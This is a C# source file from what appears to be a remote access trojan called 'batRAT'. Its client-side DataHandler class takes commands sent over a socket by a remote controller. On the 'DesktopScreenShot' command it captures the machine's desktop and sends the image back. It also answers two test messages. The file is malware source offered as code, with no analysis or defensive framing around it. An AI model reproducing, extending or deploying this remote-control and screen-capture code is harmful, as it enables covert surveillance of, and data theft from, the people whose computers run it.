using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System.Net.Sockets;

using batRAT;
using batRAT.Commands;
using Client.Core.Commands;

namespace Client.Core {
    public class DataHandler {

        Listener listener;
        Socket socket;

        public DataHandler(Listener _listener) {
            listener = _listener;
            socket = _listener.socket;
        }

        public void HandleCommand(StateObject _state, int _bytesReceived) {

            string msg = Utilities.ExtractCommand(_state, _bytesReceived).Message;
            Console.WriteLine(msg);

            CommandAnswer answer = ExtractCommand(msg);
            if(answer != null) {
                listener.Send<CommandAnswer>(answer, socket);
            }
        }

        CommandAnswer ExtractCommand(string _msg) {
            CommandTypes cmd;
            if(!Enum.TryParse(_msg, out cmd)) {
                return null;
            }

            CommandAnswer answer;

            switch(cmd) {
                case CommandTypes.DesktopScreenShot:
                    byte[] desktopScreenShot = DesktopScreenShot.TakeScreenShot();
                    answer = new CommandAnswer(desktopScreenShot, cmd);
                    break;
                case CommandTypes.TestMessage:
                    byte[] testMessage = Encoding.ASCII.GetBytes("Gotcha your message!");
                    answer = new CommandAnswer(testMessage, cmd);
                    break;
                case CommandTypes.HelloWorld:
                    byte[] helloWorld = Encoding.ASCII.GetBytes("Hello world too!");
                    answer = new CommandAnswer(helloWorld, cmd);
                    break;
                default:
                    answer = null;
                    break;
            }            

            return answer;
        }
    }
}
